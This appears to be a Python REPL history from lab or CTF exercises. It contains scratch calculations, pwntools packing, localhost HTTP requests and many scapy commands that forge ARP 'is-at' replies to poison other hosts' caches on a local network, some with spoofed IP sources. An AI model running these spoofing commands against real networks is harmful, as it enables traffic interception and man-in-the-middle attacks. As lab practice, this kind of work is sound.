import requests
url = "http://127.0.0.1:80"
payload = {"flag":"flag"}
res = requests.get(url, params=payload)
print(res)
payload = {"flag"}
res = requests.get(url, params=payload)
payload = {"flag":""}
res = requests.get(url, params=payload)
res = requests.get(url,"flag")
print(res)
len
len(a=a07f45c50062bd26288d273966409715)
len('a=a07f45c50062bd26288d273966409715')
exit
len('a=aad4272f227d23d2d54d4ab0ddd4a9e5&b=ba16b2c4 3b83612d&b8f40851#212db78a')
len('a=aad4272f227d23d2d54d4ab0ddd4a9e5&b=ba16b2c4%203b83612d%26b8f40851%23212db78a')
q
len('{"a":"36e6741f801dc92c1bc9025423345714"}')
len('{"a":"580799c3cb47b4b849c65a718f9a8326","b":{"c":"30650e80","d":["5d5fb5ae","8e5dd4eb 6592c8df&b857a82d#087a283b"]}}')
0x1337
hex(0xa29 - 0x337)
hex(0x4da - 0x337)
from pwn import *
constants.AF_INET
constants.SOCK_STREAM
q
from pwn import *
p16(80)
p16(80).hex()
p16(80,endian="big").hex()
hex(80)
from pwn import *
constants.O_WRONLY
constants.O_CREAT
0x41 | 0x1
hex(65)
0x40 | 0x1
q
hex(100)
len('vXrZLxZnEZlvRRdl2H0fD0zRsExc56LyzuhEhvPmm4GvF7vvadcGQQwTD5PymSjyZQAf3Pwe7D')
len('\r\n\r\nvXrZLxZnEZlvRRdl2H0fD0zRsExc56LyzuhEhvPmm4GvF7vvadcGQQwTD5PymSjyZQAf3Pwe7D')
256 -177
len("\r\n\r\nvXrZLxZnEZlvRRdl2H0fD0zRsExc56LyzuhEhvPmm4GvF7vvadcGQQwTD5PymSjyZQAf3Pwe7D\27")
from pwn
q
arr = [0x81, 0x0c, 0xc8, 0x01,0x30, 0x37, 0x53, 0x31, 0xbb, 0x76, 0xd8, 0x8d, 0x7b, 0x48, 0x5a, 0xaa, 0 ,0 ,0 ,0 ,0 ,0 ,0 ,0 ,0 ,0 ,0 ,0]
res= bytearray()
res.append(0x9f + 0xc5)
hex(0x9f + 0xc5)
q
0x1c
0x32 + 0xa6
hex(216)
hex(0x62 - 0xa6)
hex((0x62 - 0xa6)%256)
hex((0xbc + 0xa6)%256)
from pwn import *
p64(0x59ed47a9d5824da0)
p64(0x59ed47a9d5824da0) + p64(1)
:q
ans = '\x08\x20\x30\x20\x20\x3f\x08\x01\x20\x08\x20\x31\x20\x20\x66\x08\x01\x20\x08\x20\x32\x20\x20\x6c\x08\x01\x20\x08\x20\x33\x20\x20\x61\x08\x01\x20\x08\x20\x34\x20\x20\x67\x08\x01\x20\x08\x20\x30\x20\x20\x0\x04\x20\x1c\x08\x80\x01\x04\x20\xff\x04\x80\x20\x08\x20\x01\x08\x80\x04\x00\x80\x10'
ans = b'\x08\x20\x30\x20\x20\x3f\x08\x01\x20\x08\x20\x31\x20\x20\x66\x08\x01\x20\x08\x20\x32\x20\x20\x6c\x08\x01\x20\x08\x20\x33\x20\x20\x61\x08\x01\x20\x08\x20\x34\x20\x20\x67\x08\x01\x20\x08\x20\x30\x20\x20\x0\x04\x20\x1c\x08\x80\x01\x04\x20\xff\x04\x80\x20\x08\x20\x01\x08\x80\x04\x00\x80\x10'
str = '\x08\x20\x30\x20\x20\x3f\x08\x01\x20\x08\x20\x31\x20\x20\x66\x08\x01\x20\x08\x20\x32\x20\x20\x6c\x08\x01\x20\x08\x20\x33\x20\x20\x61\x08\x01\x20\x08\x20\x34\x20\x20\x67\x08\x01\x20\x08\x20\x30\x20\x20\x0\x04\x20\x1c\x08\x80\x01\x04\x20\xff\x04\x80\x20\x08\x20\x01\x08\x80\x04\x00\x80\x10'
str = r'\x08\x20\x30\x20\x20\x3f\x08\x01\x20\x08\x20\x31\x20\x20\x66\x08\x01\x20\x08\x20\x32\x20\x20\x6c\x08\x01\x20\x08\x20\x33\x20\x20\x61\x08\x01\x20\x08\x20\x34\x20\x20\x67\x08\x01\x20\x08\x20\x30\x20\x20\x0\x04\x20\x1c\x08\x80\x01\x04\x20\xff\x04\x80\x20\x08\x20\x01\x08\x80\x04\x00\x80\x10'
str[200]
str[201]
str[202]
len(str)
str = '\x08\x20\x30\x20\x20\x3f\x08\x01\x20\x08\x20\x31\x20\x20\x66\x08\x01\x20\x08\x20\x32\x20\x20\x6c\x08\x01\x20\x08\x20\x33\x20\x20\x61\x08\x01\x20\x08\x20\x34\x20\x20\x67\x08\x01\x20\x08\x20\x30\x20\x20\x00\x04\x20\x1c\x08\x80\x01\x04\x20\xff\x04\x80\x20\x08\x20\x01\x08\x80\x04\x00\x80\x10'
len(str)
ans = b'\x08\x20\x30\x20\x20\x3f\x08\x01\x20\x08\x20\x31\x20\x20\x66\x08\x01\x20\x08\x20\x32\x20\x20\x6c\x08\x01\x20\x08\x20\x33\x20\x20\x61\x08\x01\x20\x08\x20\x34\x20\x20\x67\x08\x01\x20\x08\x20\x30\x20\x20\x00\x04\x20\x1c\x08\x80\x01\x04\x20\xff\x04\x80\x20\x08\x20\x01\x08\x80\x04\x00\x80\x10'
len(ans)
str = r'\x08\x20\x30\x20\x20\x3f\x08\x01\x20\x08\x20\x31\x20\x20\x66\x08\x01\x20\x08\x20\x32\x20\x20\x6c\x08\x01\x20\x08\x20\x33\x20\x20\x61\x08\x01\x20\x08\x20\x34\x20\x20\x67\x08\x01\x20\x08\x20\x30\x20\x20\x00\x04\x20\x1c\x08\x80\x01\x04\x20\xff\x04\x80\x20\x08\x20\x01\x08\x80\x04\x00\x80\x10'
len(str)
288 / 3
3 * 96
8 * 8
8 * 8 * 8
'1' * 0x300
hex(80)
from pwn import *
from scapt.all import Ether,IP
from scapy.all import Ether,IP
IP().display
IP().display()
Ether().display()
Ether(type=0xFFFF)
packet = Ether(type=0xFFFF)
Ether(type=0xFFFF).display()
IP(dst=10.0.0.3).display()
IP(dst="10.0.0.3").display()
packet = Ether(type=0xFFFF)/IP(dst="10.0.0.3")
sendp(packet,iface='eth0')
from scapy.all import sendp
sendp(packet,iface='eth0')
exit
exit()
from scapy.all import ARP
ARP().display()
sendp(ARP(op='is-at',hwsrc='86:8c:c4:2f:4d:f6',psrc='10.0.0.2',hwdst='ff:ff:ff:ff:ff:ff'.pdst='10.0.0.3'))
sendp(ARP(op='is-at',hwsrc='86:8c:c4:2f:4d:f6',psrc='10.0.0.2',hwdst='ff:ff:ff:ff:ff:ff',pdst='10.0.0.3'))
from scapy.all import ARP,sendp
sendp(ARP(op='is-at',hwsrc='86:8c:c4:2f:4d:f6',psrc='10.0.0.2',hwdst='ff:ff:ff:ff:ff:ff',pdst='10.0.0.3'))
sendp(Ether(src='86:8c:c4:2f:4d:f6')/ARP(op='is-at',hwsrc='86:8c:c4:2f:4d:f6',psrc='10.0.0.2',pdst='10.0.0.3'),iface='eth0')
from scapy.all import ARP,sendp,Ether
sendp(Ether(src='86:8c:c4:2f:4d:f6')/ARP(op='is-at',hwsrc='86:8c:c4:2f:4d:f6',psrc='10.0.0.2',pdst='10.0.0.3'),iface='eth0')
sendp(Ether(src='86:8c:c4:2f:4d:f6',dst='ff:ff:ff:ff:ff:ff')/ARP(op='is-at',hwsrc='86:8c:c4:2f:4d:f6',psrc='10.0.0.2',pdst='10.0.0.3'),iface='eth0')
sendp(Ether(src='86:8c:c4:2f:4d:f6',dst='ff:ff:ff:ff:ff:ff')/ARP(op='is-at',hwsrc='86:8c:c4:2f:4d:f6',psrc='10.0.0.2'),iface='eth0')
sendp(Ether(src="86:8c:c4:2f:4d:f6", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="86:8c:c4:2f:4d:f6"), iface="eth0")
sendp(Ether(src="86:8c:c4:2f:4d:f6", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="86:8c:c4:2f:4d:f6",pdst='10.0.0.3'), iface="eth0")
sendp(Ether(src="86:8c:c4:2f:4d:f6") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="86:8c:c4:2f:4d:f6",pdst='10.0.0.3'), iface="eth0")
Ether().display()
sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="86:8c:c4:2f:4d:f6",pdst='10.0.0.3'), iface="eth0")
sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.2", hwsrc="86:8c:c4:2f:4d:f6",pdst='10.0.0.3'), iface="eth0")
exit
from scapy.all import Ether,ARP,sendp
sendp(Ether(src='6a:ca:99:70:6a:cb')/ARP(op='is-at',hwsrc='6a:ca:99:70:6a:cb',psrc='10.0.0.2',pdst='10.0.0.4'),iface='eth0')
from scapy.all import Ether,IP,sendp,ARP
>>> sendp(Ether(src="76:45:f9:f1:45:de", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc=">>> sendp(Ether(src="76:45:f9:f1:45:de", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="76:45:f9:f1:45:de") / IP(src="10.0.0.3", dst="10.0.0.4"), iface="eth0")") / IP(src="10.0.0.3", dst="10.0.0.4"), iface="eth0")
>>> sendp(Ether(src="06:6d:b4:f1:1a:d7", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="06:6d:b4:f1:1a:d7") / IP(src="10.0.0.3", dst="10.0.0.4"), iface="eth0")
sendp(Ether(src="06:6d:b4:f1:1a:d7", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="06:6d:b4:f1:1a:d7") / IP(src="10.0.0.3", dst="10.0.0.4"), iface="eth0")
sendp(Ether(src="06:6d:b4:f1:1a:d7", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="06:6d:b4:f1:1a:d7",pdst='10.0.0.4') , iface="eth0")
from sacpy.all import *
from scapy.all import *
sendp(Ether
0x40 / 8
0x40 /10
0x2f
0x2e
46 / 8 
